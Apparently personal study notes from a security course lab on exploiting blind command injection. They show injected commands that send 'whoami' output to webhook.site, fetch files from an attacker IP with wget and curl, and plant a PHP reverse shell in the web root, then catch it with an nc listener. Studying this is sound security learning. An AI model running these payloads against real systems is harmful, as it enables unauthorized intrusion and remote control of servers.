* #commandInjection  
* With blind command injection, we aren't getting feedback from the web server
* Also, sometimes our characters are getting filtered, so we have to work around that
## Testing
* `https://tcm-sec.com`
	* Response : "Website OK"
	* Previusly, the web server gave more data, so we don't get feedback on our command this time == BLIND
	* Last time we got our command as output
* `https://tcm-sec.com/FakeURl`
	* Respone: "Website not found"
	* Definitely blind command injection
*  `https://tcm-sec.com; whoami; asd`
	* Response : "Website OK"
	* It looks like we have input filtering happening, so we need to work around that
## Validating Blind Injection
* We need to validate our blind command injection, a couple ways to do it
	* Use backticks to execute command
		* OOB - Out-of-band , since we are catching it somewhere else
		* Catch the above execution  with webhook.site, similar to the xss lab.. and have the command injection send a curl request there to validate it works
	```shell
https://webhook.site/abcdefg?`whoami`
```
	* the whoami will execute, then a curl request is made  to the entire address, and we get the result in the webhook.site interface
## Try Triggering newline
```shell
# start web server to OOB catch of command injection
python3 -m http.server 8000

https://tcm-sec.com \n wget 192.168.176.129:8888/test
```
* If successful, we will see the failed GET request for the non-existant test file

## Build and Upload Payload
```shell
cp  /usr/share/webshells/laudanum/php/php-reverse-shell.php /tmp/
mv php-reverse-shell.php rev.php
subl rev.php
# update IP and PORT, then save
#start NC listening
nc -nvlp 8888

# technique 1
https://tcm-sec.com && curl 192.168.176.129:8000/rev.php > /var/www/html/rev.php

# technique 2
https://tcm-sec.com \n wget 192.168.176.129:8000/rev.php

```

## Trigger Payload
* If we are successful, we'll see the 200 status code in the python server shell
* Now browse to the file on the webserver to execute
* If successfull, we should get a shell in our nc listener



